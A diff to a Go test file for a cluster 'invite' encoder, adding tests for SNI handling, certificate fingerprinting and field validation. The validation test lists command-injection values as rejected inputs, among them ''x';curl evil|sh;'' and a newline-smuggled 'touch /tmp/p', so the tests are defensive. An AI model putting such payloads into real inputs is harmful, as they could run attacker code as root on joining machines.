@@ -1,6 +1,12 @@
 package invite
 
 import (
+	"crypto/sha256"
+	"encoding/base64"
+	"encoding/hex"
+	"encoding/json"
+	"net/http"
+	"net/http/httptest"
 	"strings"
 	"testing"
 )
@@ -31,7 +37,7 @@ func TestEncodeDecode_roundTrip(t *testing.T) {
 
 // The prefix is what makes a later format recognisable rather than guessed at.
 func TestEncode_isPrefixed(t *testing.T) {
-	encoded, err := Encode(Invite{JoinURL: "https://x", Token: "t"})
+	encoded, err := Encode(Invite{JoinURL: "https://node1.example.com", Token: strings.Repeat("a", 64)})
 	if err != nil {
 		t.Fatalf("Encode: %v", err)
 	}
@@ -115,7 +121,7 @@ func TestDecode_rejectsATruncatedInvite(t *testing.T) {
 }
 
 func TestDecode_trimsSurroundingWhitespace(t *testing.T) {
-	encoded, err := Encode(Invite{JoinURL: "https://x", Token: "t"})
+	encoded, err := Encode(Invite{JoinURL: "https://node1.example.com", Token: strings.Repeat("a", 64)})
 	if err != nil {
 		t.Fatalf("Encode: %v", err)
 	}
@@ -124,28 +130,79 @@ func TestDecode_trimsSurroundingWhitespace(t *testing.T) {
 	}
 }
 
-// The fingerprint is read from a gateway URL, which may or may not carry a
-// scheme, a port or a path.
-func TestNormalizeHostPort(t *testing.T) {
-	for _, tc := range []struct{ in, want string }{
-		{"example.com", "example.com:443"},
-		{"https://example.com", "example.com:443"},
-		{"http://example.com", "example.com:443"},
-		{"https://example.com/", "example.com:443"},
-		{"https://example.com/v1/health", "example.com:443"},
-		{"example.com:8443", "example.com:8443"},
-		{"https://example.com:8443", "example.com:8443"},
-	} {
-		if got := normalizeHostPort(tc.in); got != tc.want {
-			t.Errorf("normalizeHostPort(%q) = %q, want %q", tc.in, got, tc.want)
-		}
+func TestInvite_SNIRoundTrips(t *testing.T) {
+	enc, err := Encode(Invite{JoinURL: "https://203.0.113.5", Token: strings.Repeat("ab", 32), CAFingerprint: strings.Repeat("f", 64), SNI: "stagenet.example"})
+	if err != nil {
+		t.Fatal(err)
+	}
+	got, err := Decode(enc)
+	if err != nil || got.SNI != "stagenet.example" || got.JoinURL != "https://203.0.113.5" {
+		t.Fatalf("got %+v, %v", got, err)
 	}
 }
 
-func TestFingerprint_reportsAnUnreachableHost(t *testing.T) {
-	// 192.0.2.0/24 is TEST-NET-1 (RFC 5737): reserved for documentation and
-	// guaranteed not to be routed.
-	if _, err := Fingerprint("192.0.2.1:9"); err == nil {
-		t.Error("an unreachable host must be an error, not an empty fingerprint")
+// A node fingerprints the certificate it serves itself, which may be a staging
+// or not-yet-trusted one: reading it must not depend on its chain verifying.
+func TestFingerprintServed_ReadsAnUntrustedCertificate(t *testing.T) {
+	srv := httptest.NewTLSServer(http.HandlerFunc(func(http.ResponseWriter, *http.Request) {}))
+	defer srv.Close()
+	fp, err := FingerprintServed(srv.Listener.Addr().String(), "stagenet.example")
+	if err != nil {
+		t.Fatalf("an untrusted certificate must still be fingerprinted: %v", err)
+	}
+	sum := sha256.Sum256(srv.Certificate().Raw)
+	if fp != hex.EncodeToString(sum[:]) {
+		t.Errorf("fingerprint %s is not the served certificate's", fp)
+	}
+}
+
+// Every field of an invite lands on a root command line or in a TLS handshake
+// on the joining machine; anything the minting node would not have written is
+// refused on the way in.
+func TestDecode_refusesFieldsOfTheWrongShape(t *testing.T) {
+	good := Invite{
+		JoinURL:       "https://203.0.113.5",
+		Token:         strings.Repeat("ab", 32),
+		CAFingerprint: strings.Repeat("cd", 32),
+		SNI:           "stagenet.example",
+	}
+	for name, mutate := range map[string]func(*Invite){
+		"sni with a quote":      func(i *Invite) { i.SNI = "x';curl evil|sh;'" },
+		"sni with a newline":    func(i *Invite) { i.SNI = "a.example\ntouch /tmp/p" },
+		"sni single label":      func(i *Invite) { i.SNI = "localhost" },
+		"token not hex":         func(i *Invite) { i.Token = strings.Repeat("z", 64) },
+		"token with a newline":  func(i *Invite) { i.Token = strings.Repeat("a", 63) + "\n" },
+		"fingerprint short":     func(i *Invite) { i.CAFingerprint = "abcd" },
+		"url http":              func(i *Invite) { i.JoinURL = "http://203.0.113.5" },
+		"url with a path":       func(i *Invite) { i.JoinURL = "https://203.0.113.5/x;id" },
+		"url with userinfo":     func(i *Invite) { i.JoinURL = "https://u:p@203.0.113.5" },
+		"url with a query":      func(i *Invite) { i.JoinURL = "https://203.0.113.5?a=b" },
+		"url host with a quote": func(i *Invite) { i.JoinURL = "https://a'b.example" },
+		"url with a bad port":   func(i *Invite) { i.JoinURL = "https://203.0.113.5:99999" },
+		"url missing":           func(i *Invite) { i.JoinURL = "" },
+	} {
+		inv := good
+		mutate(&inv)
+		body, _ := json.Marshal(inv)
+		raw := prefix + base64.RawURLEncoding.EncodeToString(body)
+		if _, err := Decode(raw); err == nil {
+			t.Errorf("%s: decoded", name)
+		}
+		if _, err := Encode(inv); err == nil {
+			t.Errorf("%s: encoded", name)
+		}
+	}
+
+	enc, err := Encode(good)
+	if err != nil {
+		t.Fatalf("a well-formed invite was refused: %v", err)
+	}
+	if _, err := Decode(enc); err != nil {
+		t.Fatalf("a well-formed invite did not decode: %v", err)
+	}
+	withPort := good
+	withPort.JoinURL = "https://stagenet.example:8443/"
+	if _, err := Encode(withPort); err != nil {
+		t.Errorf("https://host:port/ was refused: %v", err)
 	}
 }
